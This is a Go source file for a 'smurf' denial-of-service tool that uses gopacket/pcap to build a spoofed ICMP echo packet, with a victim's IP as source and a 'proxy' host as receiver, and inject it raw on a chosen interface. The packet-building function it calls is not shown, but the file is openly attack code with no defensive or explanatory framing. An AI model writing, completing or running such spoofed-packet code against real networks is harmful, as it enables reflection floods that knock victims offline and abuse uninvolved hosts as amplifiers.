package main

import (
	"net"

	"github.com/google/gopacket/pcap"
	"github.com/pkg/errors"
)

type smurf struct {
	wire    *pcap.Handle
	payload []byte
}

type config struct {
	victim     net.IP           // ip address of the victim
	proxy      net.IP           // ip address of the ICMP Echo receiver
	iface      string           // outbound network interface name to use
	gatewayMAC net.HardwareAddr // MAC address of LAN's gateway router
}

func newSmurf(c config) (*smurf, error) {
	wire, err := pcap.OpenLive(c.iface, 1024, false, pcap.BlockForever)
	if err != nil {
		return nil, errors.Wrap(err, "could not acquire pcap handle to wire")
	}
	// get interface mac address
	localMAC, err := ifaceMAC(c.iface)
	if err != nil {
		return nil, errors.Wrap(err, "could not get outbound interface MAC")
	}
	payload, err := spoofedICMP(c.victim, c.proxy, localMAC, c.gatewayMAC)
	if err != nil {
		return nil, errors.Wrap(err, "could not build a spoofed payload")
	}
	return &smurf{
		wire:    wire,
		payload: payload,
	}, nil
}

func (s *smurf) execute() error {
	return s.wire.WritePacketData(s.payload)
}

func (s *smurf) close() {
	s.wire.Close()
}

func ifaceMAC(iface string) (net.HardwareAddr, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return nil, errors.Wrap(err, "could not get network interfaces")
	}
	for _, i := range interfaces {
		if i.Name == iface {
			return i.HardwareAddr, nil
		}
	}
	return nil, errors.New("interface not found")
}
